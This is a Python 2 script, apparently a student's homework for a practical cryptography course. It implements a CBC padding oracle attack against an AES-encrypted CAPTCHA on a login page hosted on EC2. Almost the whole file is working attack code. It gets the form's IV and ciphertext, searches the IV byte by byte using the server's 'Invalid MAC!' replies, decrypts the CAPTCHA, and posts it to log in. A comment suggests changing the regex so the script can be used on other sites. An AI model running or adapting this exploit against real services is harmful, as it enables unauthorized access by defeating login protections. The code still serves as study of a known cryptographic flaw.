"""
*
*@author Chang Liu
*
*This program is used to crach the CAPTCHA on Practical Crypto System homework assignment 1.
*
*It splits the ciphertext into the 16-byte long block, and only submit the 1st block to the server which contains the encrypted *CAPTCHA key. The it uses padding oracle attach to gain bypass the CAPTCHA verification and login to the system
*
*
"""
import sys
import base64
import httplib
import urllib
import urllib2
import Crypto.Cipher
import binascii
import os
import cookielib
import re

# Get the cookie and set auto attached when POST
loginUrl = "http://ec2-184-72-208-10.compute-1.amazonaws.com:80/main_login.php"; # This is the login page
cj = cookielib.CookieJar();
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj));
urllib2.install_opener(opener);
print "Connecting to the server..."
resp = urllib2.urlopen(loginUrl);
print "Connected! Cookie gained :)"

# Get the form fields
html = resp.read()
tmp =  html.replace(' ','')
tmp2 = tmp.replace('\n','')

col = []
# Change the regular expression here so you can use it on the other site
col = re.findall(r'value="(.*?)"', tmp2) 
login_captcha = ''
InitcaptchaID = col[0]
InitIv = col[1]
url = "http://ec2-184-72-208-10.compute-1.amazonaws.com:80/check_login.php"  # This is where the form data should be submitted to
#print InitcaptchaID
#print InitIv


resp.close()

# Hard coded fields, debug only
#Cookie = 'PHPSESSID=kpvhl2d3qdh9he7l23nmusce31'

#login_captcha = '7k73KU'
#InitcaptchaID = 'wUxjBVGU4xDUbshnYitXUDyh9UHaiT/0GenWxTbHcdtA3GHhwtSpJ0oeTQSDJJdq'
#InitIv = "KhdabAIp+llg3XyAB4X/Yg=="

# Set up the connection config
#url = raw_input("Please enter the URL where the form will be posted to, a sample URL looks like this: http://ec2-184-72-208-10.compute-1.amazonaws.com:80/check_login.php\n\n URL = ")
#Cookie = raw_input("\n\nPlease enter the cookie, a sample cookie looks like this: PHPSESSID=kpvhl2d3qdh9he7l23nmusce31\n\n cookie = ")
#InitIv = raw_input("\n\nPlease enter the iv, a sample iv looks like this: J/1DKv7EiqxLQyvHdXsqpw==\n\n iv = ")
#InitcaptchaID = raw_input("\n\nPlease enter the captchaID, a sample captchaID looks like this: wUxjBVGU4xDUbshnYitXUDyh9UHaiT/0GenWxTbHcdtA3GHhwtSpJ0oeTQSDJJdq\n\n captchaID = ")
#cipher = raw_input("\n\nPlese enter the encrytion algorithm you believe that had been used. e.x AES, DES")
cipher = "aes"
block_size = 16
# Decode the base64 encoded form value
captchaID = base64.b64decode(InitcaptchaID)
iv = base64.b64decode(InitIv)


def main(args):
	os.system("clear")
	print "***************************************"
	print "*  CBC Padding Oracle attacker V0.01  *"
	print "*  Author Chang Liu                   *"
	print "*  E-mail: chang.liu@jhu.edu          *"
	print "*  CS @ Johns Hopkins University      *"
	print "***************************************"
	print
	print
	raw_input("Press ENTER to start the program...")
	

	if len(iv) != block_size:
		print "IV must be the same " + str(block_size) + " bytes as the block_size!"
		return False
  
	print "Target URL = " + url
	print "IV = " + iv.encode("hex")
	print "captchaID (ciphertext) = "+ captchaID.encode("hex")
	print
 
	print "***** Padding Oracle Attack start! xD *****"
	print
	print "Encryption method: " + cipher.upper()
	print
	
	result = paddingOracle(cipher, captchaID, iv, block_size)
	
	print "\n\n\nCong! Attacking DONE!!!\n"
	print "The intermediary value I = " + result["intermediary"].encode("hex")
	print "The plaintext M = " + result["plaintext"]
	print "The value of CAPTCHA = " + result["plaintext"][:6]

	print "Will now connect to the website using the decrypted message..."
	
	# Set the filed login_captcha to the value we decrypted
	login_captcha = result["plaintext"][:6]		
	# Construct a http POST request use the decrypted login_captcha value
	response = sendRequest(login_captcha, InitcaptchaID, InitIv)
	if response:
		print
		print "Connectted!"
		print response
	else:
		print "Connection Failed"
		return False


def paddingOracle(cipher, ciphertext, iv, block_size):
	# split cipher into blocks; we will manipulate ciphertext block by block
	cipher_block = ciphertext[:block_size]
	if cipher_block:
		padResult = {}

		print "The first 16 bytes cipher block =  " + hexToString(cipher_block)
		print
		# padding oracle attach on the block
		padResult = paddingOracleBlock(cipher, cipher_block, iv, block_size)

		if not padResult:
			print "Failed to decrypt the cipher block! Please check"
			return False
 
		return padResult
	else:
		print "Failed to load the first 16 bytes ciphertext"    
		return False
 
def paddingOracleBlock(cipher, ciphertext, iv, block_size):
	result = {}
	intermediary = []  # list to save intermediary
	resultIV = [] # list to save the iv we found
 
	for i in range(1, block_size+1):
		stringIV = []
		resultIV = changeIV(resultIV, intermediary, i)
		
		for k in range(0, block_size-i):
			stringIV.append("\x00")
 
		stringIV.append("\x00")
 		print "Searching for valid IV ..."
		for b in range(0,256):
			tempIV = stringIV
			tempIV[len(tempIV)-1] = chr(b)
    
			tempIV_s = ''.join("%s" % ch for ch in tempIV)
 
			# append the iv
			for p in range(0,len(resultIV)):
				tempIV_s += resultIV[len(resultIV)-1-p]
      
			# Cut the first 16 bytes of ciphertext
			ciphertext = base64.b64encode(captchaID[:16])
			#raw_input(ciphertext)
			# Submit the 16 bytes to server to calculate the plain text which has the key of CAPTCHA
			padResult = sendRequest(login_captcha, ciphertext, base64.b64encode(tempIV_s))
 
			# Check if we got the expected 'Invalid MAC!' message
			if checkPadResult(padResult):
				print "Valid IV found!\n IV = " + hexToString(tempIV_s)
				print
				resultIV.append(chr(b))
				intermediary.append(chr(b ^ i))
        
				break
 
	plainText = ''
	for ch in range(0, len(intermediary)):
		plainText += chr( ord(intermediary[len(intermediary)-1-ch]) ^ ord(iv[ch]) )
    
	result["plaintext"] = plainText
	result["intermediary"] = ''.join("%s" % ch for ch in intermediary)[::-1]
	return result
 
# Save the iv we found via padding oracle into a list
def changeIV(resultIV, intermediary, p):
	for i in range(0, len(resultIV)):
		resultIV[i] = chr( ord(intermediary[i]) ^ p)
	return resultIV  

# Conver the hex byte into hex string 
def hexToString(str):
	hexString = ''
	for i in range(0,len(str)):
		hexString += "\\x"+binascii.b2a_hex(str[i])
	return hexString
	
# Send the HTTP POST request to the server with calculated header and body values
def sendRequest(login_captcha, captchaID, iv):
	#headers = {'Cookie' : Cookie}

	values = {'login_captcha' : login_captcha,
		'captchaID' : captchaID,
		'iv' : iv}
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)
	msg = response.read()
	#print msg
	response.close()
	return msg

#  Check to the returned page value to determine if pad is valid
def checkPadResult(plain):
	#print plain
	if plain == "Invalid MAC!":
		return True
	else:
		return False
 
if __name__ == "__main__":
    main(sys.argv)
